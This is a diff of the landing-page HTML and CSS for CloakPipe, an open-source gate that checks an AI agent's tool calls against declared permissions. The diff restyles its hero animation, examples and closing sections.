 
@@ -83,7 +151,7 @@
 <section class="section" id="examples">
   <div class="wrap">
     <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">Four examples</div><h2>One support agent.<br><span class="acc">Four days.</span></h2></div>
+      <h2>One support agent.<br><span class="dim">Four days.</span></h2>
       <p>Each example says what ships today. Where the full story needs something we have not built yet, the badge says so.</p>
     </div>
     <div class="examples reveal">
@@ -119,83 +187,258 @@
 <section class="section" id="not">
   <div class="wrap">
     <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">Scope</div><h2>What it is not</h2></div>
+      <h2>What it is not</h2>
       <p>A gate is useful because it is small and predictable. These are the things it deliberately does not try to be.</p>
     </div>
-    <div class="problems reveal">
-      <div class="feature-card"><div class="ix"></div><h3>Not a prompt filter</h3><p>It does not read prompts or classify content. There is no model and no classifier in the decision, only the contract and the call.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Not a governance platform</h3><p>It does not inventory your agents, issue identities or draw compliance charts. It produces the evidence those systems can use.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>Not a sandbox</h3><p>It cannot stop an action that never becomes a tool call through the gate, or a compromise of the host below it.</p></div>
+    <div class="cols3 reveal">
+      <div><h3>Not a prompt filter</h3><p>It does not read prompts or classify content. There is no model and no classifier in the decision, only the contract and the call.</p></div>
+      <div><h3>Not a governance platform</h3><p>It does not inventory your agents, issue identities or draw compliance charts. It produces the evidence those systems can use.</p></div>
+      <div><h3>Not a sandbox</h3><p>It cannot stop an action that never becomes a tool call through the gate, or a compromise of the host below it.</p></div>
     </div>
-  </div>
-</section>
-
-<!-- ============== FREE GATE ============== -->
-<section class="wl-band" aria-labelledby="wl-band-title">
-  <div class="wrap wl-band-inner reveal">
-    <div>
-      <div class="eyebrow">Free, open-source gate (MIT)</div>
-      <h2 id="wl-band-title">The gate is free and runs on your machines. Enforcement will never be behind a paywall.</h2>
-      <p>Start with the <a href="/docs/quickstart">quick start</a>. Hosted alerts and approvals for teams are not built yet. If you want them, tell us.</p>
-    </div>
-    <a class="btn btn-lg" href="/waitlist">Tell us you want it <span class="arr">→</span></a>
   </div>
 </section>
 
 <!-- ============== CLOSER ============== -->
 <section class="closer">
   <div class="wrap">
-    <h2 class="reveal">Model proposes.<br><span class="acc">Code disposes.</span></h2>
-    <p class="reveal" data-d="1">Put the gate in front of one MCP server, declare what the agent may do, and watch what it refuses.</p>
+    <h2 class="reveal">Put a gate in front of<br><span class="dim">your agent's tools.</span></h2>
+    <p class="reveal" data-d="1">Free, open-source gate (MIT). It runs on your machines, and enforcement will never be behind a paywall. Declare what the agent may do, and watch what it refuses.</p>
     <div class="ctas reveal" data-d="2">
-      <a class="btn btn-lg btn-cta" href="/docs/quickstart"><span class="corner"></span>Get started <span class="arr">→</span></a>
+      <a class="btn btn-lg btn-cta" href="/docs/quickstart">Get started <span class="arr">→</span></a>
       <a class="btn btn-lg btn-gh" href="https://github.com/rohansx/cloakpipe" aria-label="CloakPipe on GitHub"><svg class="gh-mark" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><span>GitHub</span></a>
-      <a class="btn btn-lg" href="/waitlist">Hosted alerts: tell us <span class="arr">→</span></a>
     </div>
-    <p class="cta-tertiary reveal" data-d="2"><a href="mailto:rohan@cloakpipe.co?subject=CloakPipe%20design%20partner">Running agents in production? Become a design partner →</a></p>
+    <div class="closer-links reveal" data-d="2"><a class="btn btn-quiet" href="/waitlist">Want hosted alerts and approvals? Tell us <span class="arr">→</span></a><a class="btn btn-quiet" href="mailto:rohan@cloakpipe.co?subject=CloakPipe%20design%20partner">Running agents in production? Become a design partner <span class="arr">→</span></a></div>
   </div>
 </section>
 
 <style>
-  .hero h1.home-h1 { font-size: clamp(34px, 4.3vw, 58px); line-height: 1.05; margin-bottom: 18px; }
-  .hero .stance { font: 500 clamp(17px, 1.6vw, 21px)/1.35 var(--mono); color: var(--accent); margin-bottom: 18px; letter-spacing: -0.01em; }
-  .hero-grid > * { min-width: 0; }
-  #hero-deny { margin: 0; min-height: 0; }
-  .term { height: auto; padding: 0; display: flex; flex-direction: column; }
-  .term .chart-header { padding: 16px 20px; margin: 0; border-bottom: 1px solid var(--line); }
-  .deny-tag { font: 600 10px var(--mono); letter-spacing: 0.12em; padding: 2px 8px; color: var(--danger); border: 1px solid currentColor; }
-  .term-body { margin: 0; padding: 20px; font: 400 12px/1.6 var(--mono); color: var(--text-2); white-space: pre; overflow-x: auto; background: var(--bg); }
-  .term-body .tc { color: var(--text-3); }
-  .term-body .tw { color: var(--text); font-weight: 600; }
-  .term-body .tt { color: var(--accent-2); }
-  .term-body .tx { color: var(--danger); font-weight: 600; }
-  .term-body .tk { color: var(--accent); font-weight: 600; }
-  .term-cap { padding: 14px 20px; font-size: 12.5px; line-height: 1.5; color: var(--text-3); border-top: 1px solid var(--line); }
-  .problems, .steps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-  .step-n { font: 500 10.5px var(--mono); letter-spacing: 0.12em; color: var(--text-3); margin-bottom: 14px; }
-  .steps .feature-card h3 { font-size: 22px; }
-  .examples { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-  .ex { border: 1px solid var(--line); background: var(--surface); padding: 24px; display: flex; flex-direction: column; gap: 10px; }
+  /* ---------- hero ---------- */
+  .hero { padding: 96px 0 0; border-bottom: 1px solid var(--line); overflow: hidden; }
+  .hero h1.home-h1 { font-size: clamp(40px, 6vw, 80px); line-height: 1.02; letter-spacing: -0.035em; font-weight: 500; max-width: none; margin-bottom: 24px; }
+  .hero-sub { display: flex; justify-content: space-between; align-items: flex-end; gap: 32px; margin-bottom: 32px; }
+  .hero .lede { font-size: 18px; line-height: 1.55; color: var(--text-2); max-width: 560px; margin: 0; }
+  .hero-new { flex: none; font-size: 14px; color: var(--text-3); display: inline-flex; gap: 8px; align-items: center; transition: color 150ms ease; }
+  .hero-new span:first-child { color: var(--text); font-weight: 500; }
+  .hero-new:hover { color: var(--text); }
+  .hero-ctas { display: flex; gap: 10px; flex-wrap: wrap; }
+
+  /* ---------- the layered scene ---------- */
+  .gate-scene { margin: 24px 0 0; position: relative; }
+  .scene-stage {
+    position: relative; max-width: 1240px; margin: 0 auto; padding: 0 16px;
+    background: radial-gradient(60% 55% at 50% 45%, color-mix(in srgb, var(--accent) 7%, transparent), transparent 70%);
+  }
+  .scene-svg { display: block; width: 100%; height: auto; overflow: visible; }
+  .gate-scene {
+    --plate-top: rgba(255, 255, 255, 0.035); --plate-r: rgba(255, 255, 255, 0.06); --plate-l: rgba(255, 255, 255, 0.025);
+    --plate-line: rgba(255, 255, 255, 0.16); --plate-grid: rgba(255, 255, 255, 0.05);
+    --gate-line: color-mix(in srgb, var(--accent) 55%, transparent); --gate-top: color-mix(in srgb, var(--accent) 6%, transparent);
+    --cube-top: #F2F2F2; --cube-r: #A6A6A6; --cube-l: #707070;
+    --ok-top: #5CFF9A; --ok-r: #18B85A; --ok-l: #0E7F3E;
+    --no-top: #FF6B6B; --no-r: #C83A3A; --no-l: #8E2626;
+    --tool-top: #1C1C1C; --tool-r: #262626; --tool-l: #141414;
+  }
+  [data-theme="light"] .gate-scene {
+    --plate-top: rgba(0, 0, 0, 0.025); --plate-r: rgba(0, 0, 0, 0.07); --plate-l: rgba(0, 0, 0, 0.04);
+    --plate-line: rgba(0, 0, 0, 0.18); --plate-grid: rgba(0, 0, 0, 0.06);
+    --cube-top: #2A2A2A; --cube-r: #161616; --cube-l: #444;
+    --ok-top: #22C463; --ok-r: #128A42; --ok-l: #0B5E2D;
+    --no-top: #E04848; --no-r: #A92B2B; --no-l: #7A1E1E;
+    --tool-top: #F4F4F4; --tool-r: #E2E2E2; --tool-l: #ECECEC;
+  }
+  .scene-svg polygon { stroke-linejoin: round; }
+  .plate-top { fill: var(--plate-top); stroke: var(--plate-line); stroke-width: 1; }
+  .plate-r { fill: var(--plate-r); stroke: var(--plate-line); stroke-width: 1; }
+  .plate-l { fill: var(--plate-l); stroke: var(--plate-line); stroke-width: 1; }
+  .plate-grid { stroke: var(--plate-grid); stroke-width: 1; }
+  .layer-gate .plate-top { fill: var(--gate-top); stroke: var(--gate-line); }
+  .layer-gate .plate-r, .layer-gate .plate-l { stroke: var(--gate-line); }
+  .layer-gate .plate-grid { stroke: color-mix(in srgb, var(--accent) 14%, transparent); }
+  .slot { fill: var(--bg); stroke: var(--gate-line); stroke-width: 1; }
+  .gate-hit { fill: color-mix(in srgb, var(--danger) 30%, transparent); stroke: var(--danger); stroke-width: 1.5; opacity: 0; }
+  .tool-top { fill: var(--tool-top); stroke: var(--plate-line); }
+  .tool-r { fill: var(--tool-r); stroke: var(--plate-line); }
+  .tool-l { fill: var(--tool-l); stroke: var(--plate-line); }
+  .tool-email .tool-top { animation: email-lit 10s infinite; }
+  .tool-name { font: 500 12px var(--mono); fill: var(--text-3); }
+  .slab-top, .slab-new-top { fill: var(--tool-top); stroke: var(--plate-line); }
+  .slab-r, .slab-new-r { fill: var(--tool-r); stroke: var(--plate-line); }
+  .slab-l, .slab-new-l { fill: var(--tool-l); stroke: var(--plate-line); }
+  .slab-new-top { fill: var(--no-top); stroke: none; } .slab-new-r { fill: var(--no-r); stroke: none; } .slab-new-l { fill: var(--no-l); stroke: none; }
+  .cube-ok-top, .cube-no-top { fill: var(--cube-top); } .cube-ok-r, .cube-no-r { fill: var(--cube-r); } .cube-ok-l, .cube-no-l { fill: var(--cube-l); }
+  .cube-red-top { fill: var(--no-top); } .cube-red-r { fill: var(--no-r); } .cube-red-l { fill: var(--no-l); }
+  .label-name { font: 600 12px var(--mono); letter-spacing: 0.12em; fill: var(--text); }
+  .label-sub { font: 400 14px var(--sans); fill: var(--text-3); }
+  .leader { stroke: var(--plate-line); stroke-dasharray: 2 4; }
+  .call-tag { font: 500 13px var(--mono); fill: var(--text-2); }
+  .deny-tag { font: 600 13px var(--mono); fill: var(--danger); opacity: 0; }
+  .deny-tag .leader { stroke: var(--danger); stroke-opacity: .6; }
+
+  /* One 10s story: the allowed call drops through the slot to the email tool,
+     then the injected call hits the gate, turns red, and a receipt lands on the
+     ledger. Translations are in SVG user units (1 layer = 150). */
+  .call-ok { animation: ok-fall 10s infinite; }
+  .call-ok .cube-ok-top { animation: ok-paint-top 10s infinite; }
+  .call-ok .cube-ok-r { animation: ok-paint-r 10s infinite; }
+  .call-ok .cube-ok-l { animation: ok-paint-l 10s infinite; }
+  .slot { animation: slot-glow 10s infinite; }
+  .call-deny { animation: deny-fall 10s infinite; }
+  .deny-paint { opacity: 0; animation: deny-paint 10s infinite; }
+  .gate-hit { animation: gate-hit 10s infinite; }
+  .deny-tag { animation: deny-tag 10s infinite; }
+  .ledger-new { opacity: 0; animation: ledger-new 10s infinite; }
+  @keyframes ok-fall {
+    0% { transform: translateY(-24px); opacity: 0; }
+    6%, 12% { transform: translateY(0); opacity: 1; animation-timing-function: cubic-bezier(.55, 0, 1, .45); }
+    32% { transform: translateY(300px); animation-timing-function: ease-out; }
+    34% { transform: translateY(294px); }
+    36%, 90% { transform: translateY(300px); opacity: 1; }
+    97%, 100% { transform: translateY(300px); opacity: 0; }
+  }
+  @keyframes ok-paint-top { 0%, 21% { fill: var(--cube-top); } 24%, 100% { fill: var(--ok-top); } }
+  @keyframes ok-paint-r { 0%, 21% { fill: var(--cube-r); } 24%, 100% { fill: var(--ok-r); } }
+  @keyframes ok-paint-l { 0%, 21% { fill: var(--cube-l); } 24%, 100% { fill: var(--ok-l); } }
+  @keyframes slot-glow { 0%, 18% { fill: var(--bg); } 22% { fill: color-mix(in srgb, var(--accent) 45%, transparent); } 30%, 100% { fill: var(--bg); } }
+  @keyframes email-lit { 0%, 33% { fill: var(--tool-top); } 36%, 60% { fill: color-mix(in srgb, var(--accent) 35%, var(--tool-top)); } 70%, 100% { fill: var(--tool-top); } }
+  @keyframes deny-fall {
+    0%, 40% { transform: translateY(-24px); opacity: 0; }
+    46%, 50% { transform: translateY(0); opacity: 1; animation-timing-function: cubic-bezier(.55, 0, 1, .45); }
+    59% { transform: translateY(150px); animation-timing-function: ease-out; }
+    61% { transform: translateY(140px); animation-timing-function: ease-in; }
+    63%, 90% { transform: translateY(150px); opacity: 1; }
+    97%, 100% { transform: translateY(150px); opacity: 0; }
+  }
+  @keyframes deny-paint { 0%, 58% { opacity: 0; } 60%, 100% { opacity: 1; } }
+  @keyframes gate-hit { 0%, 58% { opacity: 0; } 60% { opacity: 1; } 72%, 90% { opacity: .45; } 97%, 100% { opacity: 0; } }
+  @keyframes deny-tag { 0%, 61% { opacity: 0; } 65%, 90% { opacity: 1; } 97%, 100% { opacity: 0; } }
+  @keyframes ledger-new {
+    0%, 66% { opacity: 0; transform: translateY(-18px); }
+    72%, 92% { opacity: 1; transform: translateY(0); }
+    98%, 100% { opacity: 0; transform: translateY(0); }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .call-ok, .call-ok polygon, .slot, .tool-email .tool-top, .call-deny, .deny-paint, .gate-hit, .deny-tag, .ledger-new { animation: none; }
+    .call-ok { transform: translateY(300px); }
+    .call-ok .cube-ok-top { fill: var(--ok-top); } .call-ok .cube-ok-r { fill: var(--ok-r); } .call-ok .cube-ok-l { fill: var(--ok-l); }
+    .call-deny { transform: translateY(150px); }
+    .deny-paint, .deny-tag, .ledger-new { opacity: 1; }
+    .gate-hit { opacity: .45; }
+  }
+
+  .scene-steps { list-style: none; display: grid; grid-template-columns: repeat(3, 1fr); gap: 0; margin-top: 24px; padding-bottom: 72px; }
+  .scene-steps li { padding: 20px 28px 0 0; font-size: 15px; line-height: 1.55; color: var(--text-3); border-top: 1px solid var(--line); margin-right: 24px; }
+  .scene-steps strong { display: block; color: var(--text); font-weight: 500; margin-bottom: 4px; }
+  .scene-steps .n { display: inline-block; font: 500 12px var(--mono); color: var(--text-3); margin-bottom: 10px; }
+
+  /* ---------- statement ---------- */
+  .statement-band { padding: 120px 0 104px; border-bottom: 1px solid var(--line); }
+  .statement { font-size: clamp(26px, 3.4vw, 46px); line-height: 1.12; letter-spacing: -0.028em; font-weight: 500; color: var(--text-3); max-width: 1100px; }
+  .statement .hi { color: var(--text); }
+  .works-with { display: flex; flex-wrap: wrap; align-items: center; gap: 10px 28px; margin-top: 56px; font: 500 13px var(--mono); color: var(--text-3); }
+  .works-with span:first-child { color: var(--text-2); font-family: var(--sans); font-size: 15px; }
+  .works-with .sep { width: 1px; height: 18px; background: var(--line); }
+
+  /* ---------- sections ---------- */
+  .section { padding: 120px 0; }
+  .section-head { align-items: start; grid-template-columns: 1fr 1fr; margin-bottom: 72px; }
+  .section-head h2 { font-size: clamp(34px, 4.2vw, 56px); letter-spacing: -0.032em; line-height: 1.02; margin: 0; }
+  .section-head .dim, .closer .dim { color: var(--text-3); }
+  .section-head p { font-size: 17px; max-width: 560px; padding-top: 8px; }
+  .learn-more { display: inline-flex; gap: 8px; margin-top: 18px; font: 500 15px var(--sans); letter-spacing: 0; text-transform: none; color: var(--text); }
+  .learn-more:hover { color: var(--accent); }
+
+  .figs, .how-grid, .cols3 { display: grid; grid-template-columns: repeat(3, 1fr); }
+  .fig, .how, .cols3 > div { padding: 0 32px; border-left: 1px solid var(--line); }
+  .fig:first-child, .how:first-child, .cols3 > div:first-child { padding-left: 0; border-left: 0; }
+  .fig-n { font: 500 11px var(--mono); letter-spacing: 0.08em; color: var(--text-4); }
+  .fig-svg { display: block; width: 100%; max-width: 320px; height: auto; margin: 12px auto 28px; overflow: visible; }
+  .fig-svg polygon { fill: var(--bg); stroke: var(--text-3); stroke-width: 1; stroke-linejoin: round; }
+  .fig-svg .f-hot polygon { stroke: var(--text); }
+  .fig-svg .f-hot polygon:last-child { fill: color-mix(in srgb, var(--text) 10%, var(--bg)); }
+  .fig-svg .f-wall { fill: color-mix(in srgb, var(--accent) 6%, var(--bg)); stroke: color-mix(in srgb, var(--accent) 60%, transparent); }
+  .fig-svg line { stroke: var(--text-4); stroke-width: 1; }
+  .fig-svg .f-dash { stroke-dasharray: 2 4; }
+  .fig-svg .f-hidden { stroke: var(--danger); stroke-dasharray: 3 3; }
+  .fig h3, .how h3, .cols3 h3 { font: 500 17px/1.3 var(--sans); letter-spacing: -0.01em; margin-bottom: 10px; color: var(--text); }
+  .fig p, .how p, .cols3 p { font-size: 15px; line-height: 1.6; color: var(--text-3); }
+  .how code, .ex code { font-size: 0.9em; color: var(--text-2); overflow-wrap: anywhere; }
+  .step-n { font: 500 12px var(--mono); color: var(--text-4); margin-bottom: 6px; }
+
+  .panel { border: 1px solid var(--line); border-radius: 12px; background: var(--surface); padding: 6px 16px 14px; margin-bottom: 28px; font: 400 12.5px/1.5 var(--mono); color: var(--text-2); height: 252px; overflow: hidden; box-shadow: 0 30px 60px -40px rgba(0,0,0,.6); }
+  .panel-bar { margin: 0 -16px 10px; padding: 8px 16px; border-bottom: 1px solid var(--line); font-size: 11px; color: var(--text-4); letter-spacing: 0.04em; }
+  .pc-tool { color: var(--text); font-weight: 600; margin-top: 8px; }
+  .pc-tool.off, .pc-row.off { color: var(--text-4); }
+  .pc-tool.off { text-decoration: line-through; }
+  .pc-row { display: grid; grid-template-columns: 76px 1fr; gap: 8px; padding-left: 12px; color: var(--text-3); }
+  .pd-row { display: grid; grid-template-columns: 52px 1fr auto; gap: 8px; padding: 7px 0; border-bottom: 1px solid var(--line-soft); align-items: baseline; }
+  .pd-row:last-child { border-bottom: 0; }
+  .pd-row em { font-style: normal; font-size: 11px; color: var(--text-4); }
+  .pd-k { font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em; }
+  .pd-row.ok .pd-k { color: var(--accent); } .pd-row.no .pd-k { color: var(--danger); } .pd-row.hold .pd-k { color: var(--warn); }
+  .pl-chain { display: flex; align-items: center; margin: 14px 0 18px; }
+  .pl-b { display: flex; flex-direction: column; padding: 6px 10px; border: 1px solid var(--line); border-radius: 6px; color: var(--text); font-weight: 600; }
+  .pl-b i { font-style: normal; font-weight: 400; font-size: 11px; color: var(--text-4); }
+  .pl-b.hot { border-color: var(--text-3); }
+  .pl-l { flex: 1; height: 1px; background: var(--line); min-width: 10px; }
+  .pl-row { display: flex; justify-content: space-between; padding: 6px 0; border-top: 1px solid var(--line-soft); color: var(--text-3); }
+  .pl-row .ok { color: var(--accent); font-weight: 600; }
+
+  /* ---------- terminal ---------- */
+  .term { margin: 0; border: 1px solid var(--line); border-radius: 14px; background: var(--surface); overflow: hidden; box-shadow: 0 40px 80px -50px rgba(0,0,0,.7); }
+  .term-bar { display: flex; align-items: center; gap: 16px; padding: 12px 18px; border-bottom: 1px solid var(--line); font: 500 12px var(--mono); color: var(--text-3); }
+  .term-bar .dots { display: inline-flex; gap: 6px; } .term-bar .dots i { width: 10px; height: 10px; border-radius: 50%; background: var(--line); }
+  .term-bar .deny-tag { margin-left: auto; opacity: 1; animation: none; font: 600 10.5px var(--mono); letter-spacing: 0.12em; padding: 2px 8px; color: var(--danger); border: 1px solid currentColor; border-radius: 4px; }
+  .term-body { margin: 0; padding: 24px 28px; font: 400 13.5px/1.7 var(--mono); color: var(--text-2); white-space: pre; overflow-x: auto; background: var(--bg); }
+  .term-body .tc { color: var(--text-4); } .term-body .tw { color: var(--text); font-weight: 600; }
+  .term-body .tt { color: var(--accent-2); } .term-body .tx { color: var(--danger); font-weight: 600; } .term-body .tk { color: var(--accent); font-weight: 600; }
+  .term-cap { padding: 14px 20px; font-size: 13px; line-height: 1.5; color: var(--text-3); border-top: 1px solid var(--line); }
+
+  /* ---------- examples ---------- */
+  .examples { display: grid; grid-template-columns: 1fr 1fr; border-top: 1px solid var(--line); }
+  .ex { padding: 32px 32px 32px 0; display: flex; flex-direction: column; gap: 10px; border-bottom: 1px solid var(--line); }
+  .ex:nth-child(even) { padding: 32px 0 32px 32px; border-left: 1px solid var(--line); }
   .ex-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; flex-wrap: wrap; }
-  .ex-n { font: 500 10.5px var(--mono); letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-3); }
-  .ex h3 { font: 600 18px var(--sans); letter-spacing: -0.012em; }
-  .ex p { font-size: 13.5px; color: var(--text-2); line-height: 1.55; }
-  .ex p.ex-note { margin-top: auto; padding-top: 10px; border-top: 1px solid var(--line); font-size: 12.5px; color: var(--text-3); }
-  .ex code, .feature-card code { font-size: 0.92em; overflow-wrap: anywhere; }
-  .status { font: 600 9.5px/1.5 var(--mono); letter-spacing: 0.08em; text-transform: uppercase; padding: 2px 7px; border: 1px solid currentColor; }
-  .status.shipping { color: var(--accent); }
-  .status.partial { color: var(--warn); }
-  .wl-band { border-bottom: 1px solid var(--line); background: var(--surface); }
-  .wl-band-inner { display: flex; align-items: center; justify-content: space-between; gap: 32px; padding-top: 36px; padding-bottom: 36px; }
-  .wl-band .eyebrow { margin-bottom: 12px; }
-  .wl-band h2 { font: 500 clamp(19px, 2vw, 24px)/1.25 var(--sans); letter-spacing: -0.015em; max-width: 720px; margin-bottom: 8px; }
-  .wl-band p { font-size: 14px; color: var(--text-2); }
-  .wl-band p a { color: var(--accent); border-bottom: 1px solid var(--accent); }
-  .wl-band .btn { flex: none; }
-  @media (max-width: 1100px) { .problems, .steps { grid-template-columns: 1fr; } }
+  .ex-n { font: 500 11px var(--mono); letter-spacing: 0.08em; text-transform: uppercase; color: var(--text-4); }
+  .ex h3 { font: 500 20px var(--sans); letter-spacing: -0.015em; }
+  .ex p { font-size: 15px; color: var(--text-3); line-height: 1.6; }
+  .ex p.ex-note { margin-top: auto; padding-top: 12px; font-size: 13px; color: var(--text-4); }
+  .status { font: 500 11px/1.5 var(--mono); padding: 2px 9px; border-radius: 999px; border: 1px solid currentColor; }
+  .status.shipping { color: var(--accent); } .status.partial { color: var(--warn); }
+
+  /* ---------- closer ---------- */
+  .closer { background: var(--bg); color: var(--text); border-top: 1px solid var(--line); padding: 160px 0 140px;
+    background-image: radial-gradient(50% 60% at 50% 100%, color-mix(in srgb, var(--accent) 8%, transparent), transparent 70%); }
+  .closer h2 { font-size: clamp(38px, 5.4vw, 72px); letter-spacing: -0.035em; margin-bottom: 24px; }
+  .closer > .wrap > p { font-size: 17px; color: var(--text-2); max-width: 560px; margin: 0 auto 36px; line-height: 1.55; }
+  .closer .btn { border-color: var(--line); color: var(--text); }
+  .closer .btn-cta { background: var(--text); color: var(--bg); border-color: var(--text); }
+  .closer .btn:hover { background: var(--surface-2); color: var(--text); }
+  .closer .btn-cta:hover { background: var(--text-2); color: var(--bg); }
+  .closer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 36px; margin-top: 36px; }
+  .closer .btn-quiet { border: 0; padding: 0; color: var(--text-3); background: none; }
+  .closer .btn-quiet:hover { color: var(--text); background: none; }
+
+  @media (max-width: 1000px) {
+    .figs, .how-grid, .cols3, .scene-steps { grid-template-columns: 1fr; }
+    .fig, .how, .cols3 > div { padding: 32px 0; border-left: 0; border-top: 1px solid var(--line); }
+    .fig:first-child, .how:first-child, .cols3 > div:first-child { padding-top: 0; border-top: 0; }
+    .section-head { grid-template-columns: 1fr; gap: 24px; }
+  }
   @media (max-width: 760px) {
-    .wl-band-inner { flex-direction: column; align-items: flex-start; }
+    .hero { padding-top: 64px; }
+    .br-d { display: none; }
+    .hero-sub { flex-direction: column; align-items: flex-start; gap: 16px; }
+    .hero .lede { font-size: 16.5px; }
+    .gate-scene { margin-top: 40px; }
+    .scene-stage { padding: 0; }
+    .scene-svg { width: 140%; margin-left: -32%; }
+    .scene-svg .scene-label, .scene-svg .call-tag, .scene-svg .ledger text, .scene-svg .tool-name, .scene-svg .deny-tag { display: none; }
+    .scene-steps li { margin-right: 0; }
+    .statement-band { padding: 80px 0 72px; }
+    .section { padding: 80px 0; }
     .examples { grid-template-columns: 1fr; }
-    .term-body { font-size: 11px; padding: 16px; }
+    .ex, .ex:nth-child(even) { padding: 28px 0; border-left: 0; }
+    .term-body { font-size: 11.5px; padding: 18px; }
+    .closer { padding: 100px 0 90px; }
   }
 </style>
